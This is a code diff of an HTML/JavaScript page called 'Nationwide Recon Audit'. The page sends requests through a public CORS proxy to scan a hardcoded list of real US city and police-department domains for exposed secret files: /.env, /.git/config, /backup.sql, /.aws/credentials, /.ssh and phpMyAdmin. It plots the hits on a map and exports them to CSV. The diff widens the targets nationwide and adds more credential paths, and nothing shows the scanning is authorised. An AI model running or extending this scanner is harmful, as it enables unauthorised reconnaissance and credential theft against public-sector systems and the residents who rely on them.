@@ -3,61 +3,79 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Recon – Physical Map + CSV Export</title>
+  <title>Nationwide Recon – Map + Receipt Mode</title>
   <style>
     * { box-sizing: border-box; }
     body { background: #0b0e14; color: #c8d0dc; font-family: 'Segoe UI', sans-serif; padding: 20px; margin: 0; }
-    .container { max-width: 1200px; margin: 0 auto; }
+    .container { max-width: 1300px; margin: 0 auto; }
     h1 { color: #7ab7ff; display: flex; align-items: center; gap: 12px; }
+    .sub-text { color: #8895aa; margin-bottom: 20px; font-size: 14px; }
     .controls { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; align-items: center; }
     .controls input { flex: 1; min-width: 180px; padding: 12px; border-radius: 8px; border: 1px solid #2a3344; background: #141a24; color: #fff; }
-    .controls button { padding: 12px 22px; background: #1a6bff; border: none; border-radius: 8px; color: #fff; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 6px; }
+    .controls button { padding: 12px 22px; background: #1a6bff; border: none; border-radius: 8px; color: #fff; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; }
+    .controls button:hover { background: #2a7bff; }
+    #recordToggle { background: #2a3344; }
     #recordToggle.recording { background: #b71c1c; animation: pulse 1.2s infinite; }
     #exportCSV { background: #2a5a2a; border: 1px solid #4caf50; color: #a5d6a7; }
+    #downloadLog { background: #2a3a2a; border: 1px solid #4caf50; color: #a5d6a7; display: none; }
     .dot { display: inline-block; width: 14px; height: 14px; border-radius: 50%; background: #555; }
     @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     .map-view { position: relative; width: 100%; background: #0f121a; border-radius: 12px; border: 1px solid #1f2a3a; overflow: hidden; }
     canvas { display: block; width: 100%; height: auto; cursor: pointer; }
-    .detail-panel { display: none; position: fixed; right: 0; top: 0; bottom: 0; width: 400px; background: #141a24; border-left: 2px solid #1f2a3a; padding: 20px; overflow-y: auto; z-index: 1000; box-shadow: -4px 0 20px rgba(0,0,0,0.6); }
+    .detail-panel { display: none; position: fixed; right: 0; top: 0; bottom: 0; width: 450px; background: #141a24; border-left: 2px solid #1f2a3a; padding: 20px; overflow-y: auto; z-index: 1000; box-shadow: -4px 0 20px rgba(0,0,0,0.6); }
     .detail-panel.open { display: block; }
-    .log { margin-top: 16px; background: #0b0e14; border: 1px solid #1f2a3a; border-radius: 8px; padding: 12px; font-family: 'Courier New', monospace; font-size: 12px; max-height: 250px; overflow-y: auto; color: #6a7a8e; white-space: pre-wrap; }
+    .log { margin-top: 16px; background: #0b0e14; border: 1px solid #1f2a3a; border-radius: 8px; padding: 12px; font-family: 'Courier New', monospace; font-size: 11px; max-height: 250px; overflow-y: auto; color: #6a7a8e; white-space: pre-wrap; }
+    .panel-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.4); z-index: 999; }
+    .panel-overlay.open { display: block; }
+    .path-item { display: flex; justify-content: space-between; padding: 4px 8px; background: #0b0e14; border-radius: 4px; margin-bottom: 3px; border-left: 3px solid transparent; }
+    .path-item.found { border-left-color: #4caf50; color: #fff; }
+    .path-item.notfound { border-left-color: #4a5568; color: #4a5568; }
   </style>
 </head>
 <body>
 <div class="container">
-  <h1>🗺️ Recon Map (Receipt Mode)</h1>
+  <h1>🗺️ Nationwide Recon Audit (Receipt Mode)</h1>
+  <div class="sub-text">Physical mapping of municipal nodes. No guesses. Click nodes for the "Other Listing" of data.</div>
   <div class="controls">
-    <input type="text" id="domainInput" value="hbpd.org, huntingtonbeachca.gov, newportbeachca.gov, nbpd.org, santamonica.gov, santamonicapd.org, cityofirvine.org, irvinepd.org" />
+    <input type="text" id="domainInput" value="hbpd.org, huntingtonbeachca.gov, newportbeachca.gov, santamonicapd.org, cityofirvine.org, columbus.gov, dallaspolice.net, stpaul.gov, acworth.org, ardmorecity.org, suffolkva.us, anchorage.gov, wichita.gov, desmoines.gov" />
     <button id="scanBtn">▶ Run Scan</button>
     <button id="recordToggle"><span class="dot"></span> <span id="recordLabel">Record (OFF)</span></button>
-    <button id="exportCSV">⬇ Export CSV</button>
-    <button id="downloadLog" style="display:none;">⬇ Receipt</button>
+    <button id="exportCSV">⬇ Export Excel</button>
+    <button id="downloadLog">⬇ Receipt</button>
   </div>
   <div id="resultsContainer" class="map-view"></div>
-  <div id="log" class="log">Ready. All data stays local.</div>
+  <div id="log" class="log">Ready. Keylogger receipt logs every full URL.</div>
 </div>
+
+<div class="panel-overlay" id="panelOverlay"></div>
 <div id="detailPanel" class="detail-panel">
-  <button onclick="document.getElementById('detailPanel').classList.remove('open')" style="float:right;background:#2a3344;color:#fff;border:none;cursor:pointer;padding:5px 10px;">✕</button>
+  <button onclick="closePanel()" style="float:right;background:#2a3344;color:#fff;border:none;cursor:pointer;padding:5px 10px;">✕</button>
   <h2 id="panelDomain">Domain</h2>
   <div id="panelPathList"></div>
 </div>
+
 <script>
   (function() {
     const PROXY = 'https://corsproxy.io/?';
-    const adminPaths = ['/admin', '/.env', '/.git/config', '/backup.sql', '/.aws/credentials', '/config', '/phpmyadmin'];
+    const adminPaths = ['/admin', '/.env', '/.git/config', '/backup.sql', '/.aws/credentials', '/config', '/phpmyadmin', '/.aws/config', '/.ssh'];
     const cityCoords = {
-      'hbpd.org': { x: 0.25, y: 0.70 }, 'huntingtonbeachca.gov': { x: 0.25, y: 0.75 },
-      'newportbeachca.gov': { x: 0.35, y: 0.80 }, 'nbpd.org': { x: 0.38, y: 0.82 },
-      'santamonica.gov': { x: 0.10, y: 0.30 }, 'santamonicapd.org': { x: 0.08, y: 0.33 },
-      'cityofirvine.org': { x: 0.45, y: 0.65 }, 'irvinepd.org': { x: 0.48, y: 0.68 }
+      'hbpd.org': { x: 0.12, y: 0.70 }, 'huntingtonbeachca.gov': { x: 0.12, y: 0.72 },
+      'newportbeachca.gov': { x: 0.14, y: 0.75 }, 'santamonica.gov': { x: 0.08, y: 0.65 },
+      'santamonicapd.org': { x: 0.08, y: 0.67 }, 'cityofirvine.org': { x: 0.15, y: 0.72 },
+      'columbus.gov': { x: 0.72, y: 0.42 }, 'dallaspolice.net': { x: 0.52, y: 0.75 },
+      'stpaul.gov': { x: 0.55, y: 0.35 }, 'acworth.org': { x: 0.78, y: 0.70 },
+      'ardmorecity.org': { x: 0.50, y: 0.68 }, 'suffolkva.us': { x: 0.88, y: 0.52 },
+      'anchorage.gov': { x: 0.15, y: 0.20 }, 'wichita.gov': { x: 0.48, y: 0.52 },
+      'desmoines.gov': { x: 0.53, y: 0.45 }
     };
-    let isRecording = false, sessionLog = [], allResults = [];
+    let isRecording = false, sessionLog = [], allResults = [], mapNodes = [];
 
     async function checkUrl(url) {
       try {
         const resp = await fetch(PROXY + encodeURIComponent(url), { signal: AbortSignal.timeout(8000) });
         const line = `[${new Date().toLocaleTimeString()}] ${resp.ok ? '✅' : '❌'} ${url} → ${resp.status}`;
         document.getElementById('log').textContent += `\n${line}`;
+        document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
         if (isRecording) sessionLog.push(line);
         return { url, status: resp.status, ok: resp.ok };
       } catch (e) { return { url, status: 0, ok: false }; }
@@ -66,7 +84,13 @@
     async function runScan() {
       const domains = document.getElementById('domainInput').value.split(',').map(s => s.trim());
       allResults = [];
+      scanBtn.disabled = true;
+      isRecording = true;
+      document.getElementById('recordToggle').classList.add('recording');
+      document.getElementById('recordLabel').textContent = 'RECORDING';
+
       for (const domain of domains) {
+        if (!domain) continue;
         let base = 'https://' + domain;
         let res = await checkUrl(base);
         const paths = [];
@@ -77,33 +101,79 @@
         allResults.push({ domain, reachable: res.ok, paths, foundPaths: paths.filter(p => p.found) });
         renderMap();
       }
+
       isRecording = false;
+      scanBtn.disabled = false;
       document.getElementById('recordToggle').classList.remove('recording');
+      document.getElementById('recordLabel').textContent = 'Record (OFF)';
       document.getElementById('downloadLog').style.display = 'inline-flex';
     }
 
     function renderMap() {
-      const resultsContainer = document.getElementById('resultsContainer');
-      resultsContainer.innerHTML = '<canvas id="mapCanvas" width="800" height="600"></canvas>';
-      const ctx = document.getElementById('mapCanvas').getContext('2d');
-      ctx.fillStyle = '#0f121a'; ctx.fillRect(0, 0, 800, 600);
-      allResults.forEach(r => {
-        const coords = cityCoords[r.domain] || { x: Math.random(), y: Math.random() };
-        const color = r.reachable ? (r.foundPaths.length > 0 ? '#ffa726' : '#4caf50') : '#f44336';
-        ctx.beginPath(); ctx.arc(coords.x * 800, coords.y * 600, 15, 0, Math.PI * 2);
-        ctx.fillStyle = color; ctx.fill();
-        ctx.fillStyle = '#fff'; ctx.fillText(r.domain, coords.x * 800 - 20, coords.y * 600 - 20);
+      const container = document.getElementById('resultsContainer');
+      if (!document.getElementById('mapCanvas')) {
+        container.innerHTML = '<canvas id="mapCanvas" width="1000" height="600"></canvas>';
+      }
+      const canvas = document.getElementById('mapCanvas');
+      const ctx = canvas.getContext('2d');
+      ctx.fillStyle = '#0f121a'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+      
+      // Simple US Outline hint
+      ctx.strokeStyle = '#1f2a3a'; ctx.lineWidth = 1;
+      ctx.strokeRect(50, 50, 900, 500);
+
+      mapNodes = [];
+      const domains = document.getElementById('domainInput').value.split(',').map(s => s.trim());
+      
+      domains.forEach(d => {
+        const result = allResults.find(r => r.domain === d);
+        const coords = cityCoords[d] || { x: Math.random() * 0.8 + 0.1, y: Math.random() * 0.6 + 0.2 };
+        const color = result ? (result.reachable ? (result.foundPaths.length > 0 ? '#ffa726' : '#4caf50') : '#f44336') : '#555';
+        
+        const px = coords.x * canvas.width;
+        const py = coords.y * canvas.height;
+
+        ctx.beginPath(); ctx.arc(px, py, 12, 0, Math.PI * 2); ctx.fillStyle = color; ctx.fill();
+        ctx.fillStyle = '#fff'; ctx.font = '10px sans-serif'; ctx.fillText(d, px - 20, py - 20);
+        
+        mapNodes.push({ x: px, y: py, r: 12, domain: d, result });
       });
+
+      canvas.onclick = (e) => {
+        const rect = canvas.getBoundingClientRect();
+        const mx = (e.clientX - rect.left) * (canvas.width / rect.width);
+        const my = (e.clientY - rect.top) * (canvas.height / rect.height);
+        mapNodes.forEach(n => {
+          if (Math.hypot(mx - n.x, my - n.y) < n.r && n.result) openPanel(n.domain, n.result);
+        });
+      };
     }
 
-    document.getElementById('scanBtn').onclick = () => { isRecording = true; document.getElementById('recordToggle').classList.add('recording'); runScan(); };
-    document.getElementById('exportCSV').onclick = () => {
-      let csv = 'Domain,Path,Status\n';
-      allResults.forEach(r => r.paths.forEach(p => csv += `${r.domain},${p.path},${p.status}\n`));
-      const blob = new Blob([csv], { type: 'text/csv' });
-      const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'recon_audit.csv'; a.click();
+    function openPanel(domain, result) {
+      document.getElementById('panelDomain').textContent = domain;
+      document.getElementById('panelPathList').innerHTML = result.paths.map(p => 
+        `<div class="path-item ${p.found ? 'found' : 'notfound'}"><span>${p.path}</span><span>${p.status}</span></div>`
+      ).join('');
+      document.getElementById('detailPanel').classList.add('open');
+      document.getElementById('panelOverlay').classList.add('open');
+    }
+
+    window.closePanel = () => {
+      document.getElementById('detailPanel').classList.remove('open');
+      document.getElementById('panelOverlay').classList.remove('open');
     };
-    renderMap();
+
+    document.getElementById('scanBtn').onclick = runScan;
+    document.getElementById('exportCSV').onclick = () => {
+      let csv = 'Domain,Path,Status,Found\n';
+      allResults.forEach(r => r.paths.forEach(p => csv += `${r.domain},${p.path},${p.status},${p.found}\n`));
+      const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([csv], { type: 'text/csv' })); a.download = 'nationwide_recon.csv'; a.click();
+    };
+    document.getElementById('downloadLog').onclick = () => {
+      const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([sessionLog.join('\n')], { type: 'text/plain' })); a.download = 'receipt.log'; a.click();
+    };
+
+    renderMap(); // Markers first
   })();
 </script>
 </body>
